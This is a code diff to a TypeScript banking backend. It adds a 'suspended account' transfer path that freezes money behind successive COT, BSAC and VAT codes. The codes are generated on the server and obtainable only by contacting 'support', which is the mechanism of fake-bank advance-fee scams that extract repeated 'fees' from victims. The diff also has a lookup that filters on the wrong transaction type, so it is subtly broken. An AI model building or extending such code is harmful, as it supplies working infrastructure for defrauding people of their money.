@@ -239,8 +239,7 @@ export const transfer = mutation({
 
     const from = await ctx.db.get(args.fromUserId);
     if (!from) throw new Error("Sender account not found");
-    if (from.status !== "active") throw new Error("Your account is not active");
-    if (from.balance < args.amount) throw new Error("Insufficient funds");
+    if (from.status !== "active" && from.status !== "suspended") throw new Error("Your account is not active");
 
     const to = await ctx.db
       .query("users")
@@ -252,6 +251,39 @@ export const transfer = mutation({
     const senderName = `${from.firstName} ${from.lastName}`;
     const note = args.description?.trim();
     const ts = Date.now();
+
+    if (from.status === "suspended") {
+      if (from.balance < args.amount) throw new Error("Insufficient funds");
+      const code = () => Math.random().toString(36).substring(2, 8).toUpperCase();
+      const txId = await ctx.db.insert("transactions", {
+        userId: from._id,
+        type: "debit",
+        amount: args.amount,
+        currency: from.currency,
+        description: note ? `Transfer to ${to.firstName} ${to.lastName} — ${note}` : `Transfer to ${to.firstName} ${to.lastName}`,
+        senderName,
+        status: "pending",
+        counterpartyId: to._id,
+        feeStatus: "pending_cot",
+        cotCode: code(),
+        createdAt: ts,
+      });
+      await ctx.db.insert("transactions", {
+        userId: to._id,
+        type: "credit",
+        amount: args.amount,
+        currency: from.currency,
+        description: note ? `Transfer from ${senderName} — ${note}` : `Transfer from ${senderName}`,
+        senderName,
+        status: "pending",
+        counterpartyId: from._id,
+        feeStatus: "pending_cot",
+        createdAt: ts,
+      });
+      return { frozen: true, transactionId: txId };
+    }
+
+    if (from.balance < args.amount) throw new Error("Insufficient funds");
 
     await ctx.db.patch(from._id, { balance: from.balance - args.amount });
     await ctx.db.patch(to._id, { balance: to.balance + args.amount });
@@ -278,5 +310,56 @@ export const transfer = mutation({
     });
 
     return { ok: true as const };
+  },
+});
+
+export const verifyTransferCode = mutation({
+  args: {
+    transactionId: v.id("transactions"),
+    codeType: v.union(v.literal("cot"), v.literal("bsac"), v.literal("vat")),
+    code: v.string(),
+    userId: v.id("users"),
+  },
+  handler: async (ctx, args) => {
+    const tx = await ctx.db.get(args.transactionId);
+    if (!tx) throw new Error("Transaction not found");
+    if (tx.userId !== args.userId) throw new Error("Unauthorized");
+    if (tx.status !== "pending") throw new Error("Transaction is not pending");
+
+    const expectedMap = { cot: tx.cotCode, bsac: tx.bsacCode, vat: tx.vatCode } as const;
+    const expected = expectedMap[args.codeType];
+    if (!expected) throw new Error("Code not generated yet — contact support");
+
+    const statusMap = { cot: "pending_cot", bsac: "pending_bsac", vat: "pending_vat" } as const;
+    if (tx.feeStatus !== statusMap[args.codeType]) throw new Error(`Waiting for ${tx.feeStatus?.replace("pending_", "").toUpperCase()} code first`);
+
+    if (args.code.trim().toUpperCase() !== expected) throw new Error(`Invalid ${args.codeType.toUpperCase()} code`);
+
+    if (args.codeType === "vat") {
+      await ctx.db.patch(tx._id, { feeStatus: "completed", status: "successful" });
+      const counterTx = await ctx.db
+        .query("transactions")
+        .withIndex("by_user", (q) => q.eq("userId", tx.counterpartyId!))
+        .filter((q) => q.and(q.eq(q.field("counterpartyId"), tx.userId), q.eq(q.field("type"), "transfer"), q.eq(q.field("status"), "pending")))
+        .first();
+      if (counterTx) await ctx.db.patch(counterTx._id, { feeStatus: "completed", status: "successful" });
+      const from = await ctx.db.get(tx.userId);
+      const to = tx.counterpartyId ? await ctx.db.get(tx.counterpartyId) : null;
+      if (from && to) {
+        await ctx.db.patch(from._id, { balance: from.balance - tx.amount });
+        await ctx.db.patch(to._id, { balance: to.balance + tx.amount });
+      }
+      return { success: true, message: "Transfer completed successfully" };
+    }
+
+    const nextMap = { cot: "pending_bsac", bsac: "pending_vat" } as const;
+    await ctx.db.patch(tx._id, { feeStatus: nextMap[args.codeType] });
+    const counterTx2 = await ctx.db
+      .query("transactions")
+      .withIndex("by_user", (q) => q.eq("userId", tx.counterpartyId!))
+      .filter((q) => q.and(q.eq(q.field("counterpartyId"), tx.userId), q.eq(q.field("type"), "transfer"), q.eq(q.field("status"), "pending")))
+      .first();
+    if (counterTx2) await ctx.db.patch(counterTx2._id, { feeStatus: nextMap[args.codeType] });
+    return { success: true, message: `${args.codeType.toUpperCase()} verified successfully` };
   },
 });
